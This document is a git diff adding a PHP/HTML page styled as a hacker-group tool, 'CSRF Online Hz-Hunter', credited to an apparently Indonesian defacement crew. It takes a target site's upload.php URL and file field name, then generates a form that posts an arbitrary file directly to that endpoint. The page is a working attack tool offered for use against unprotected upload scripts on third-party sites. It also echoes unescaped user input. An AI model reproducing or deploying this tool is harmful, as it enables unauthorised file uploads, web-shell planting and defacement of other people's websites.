@@ -1,0 +1,103 @@
+<html>
+<head>
+<title>CSRF Online Hz-Hunter</title>
+<link rel="icon" href="https://i.ibb.co/N1ZvqCH/rawrs.jpg">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans+Narrow|Just+Another+Hand" rel="stylesheet">
+<link href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700" rel="stylesheet" type="text/css">
+
+<!-- Meta Data -->
+         <meta content='CSRF Online Kalimantan Cyber' name='title'>
+         <meta content='CSRF Online Kalimantan Cyber' name='description'>
+         <meta content='CSRF Online' name='keywords'>
+         <meta content='CSRF Online' name='Abstract'>
+<!-- Akhir Meta Dta -->
+
+<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+</head>
+<!-- Akhir Head -->
+
+<!-- Body -->
+<body bgcolor="black">
+    
+    <!-- Style Css -->
+    <style>
+
+@keyframes shake {
+
+  0% { transform: translate(1px, 1px) rotate(0deg); }
+
+  10% { transform: translate(-1px, -2px) rotate(-1deg); }
+
+  20% { transform: translate(-3px, 0px) rotate(1deg); }
+
+  30% { transform: translate(3px, 2px) rotate(0deg); }
+
+  40% { transform: translate(1px, -1px) rotate(1deg); }
+
+  50% { transform: translate(-1px, 2px) rotate(-1deg); }
+
+  60% { transform: translate(-3px, 1px) rotate(0deg); }
+
+  70% { transform: translate(3px, 1px) rotate(-1deg); }
+
+  80% { transform: translate(-1px, -1px) rotate(1deg); }
+
+  90% { transform: translate(1px, 1px) rotate(0deg); }
+
+  100% { transform: translate(1px, -2px) rotate(-1deg); }
+
+}
+
+.x{
+
+      animation: shake 3s;
+
+  animation-iteration-count: infinite;
+
+    font-family: 'Just Another Hand', cursive;
+
+    font-size:58px;
+    
+    color: white;
+
+}
+
+.z{
+
+    font-family: 'PT Sans Narrow', cursive;
+
+    font-size:20px;
+    color: white;
+}
+
+</style>
+<!-- Akhir Style -->
+<center>
+<div class="x">Welcome To CSRF Hz-Hunter</div>
+<div class="z">
+    
+<marquee width="100%" direction="right" behavior="alternate" scrollamount="10">$  HzXor - Indonesian Security Down - KalimantanCyber ID  $</marquee>
+</div>
+<br><br>
+<img src="https://i.ibb.co/N1ZvqCH/rawrs.jpg" width="250" alt="">
+
+<!-- Post Data -->
+<form method="post">
+<font size="6" color="white" face="arial" style="text-shadow: 1px 0px 5px red;">
+URL: <input type="text" name="url" size="35" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
+POST File: <font color="white"> <input type="text" name="pf" size="35" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br></font>
+<input type="submit" name="d" value="Kunci Target!!!">
+</form>
+<?php
+$url = $_POST['url'];
+$pf = $_POST['pf'];
+$d = $_POST['d'];
+if($d) {
+    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Gass!'></form";
+}
+?>
+</form>
+</center>
+<!-- Akhir Post Data -->
+</body>
+</html>
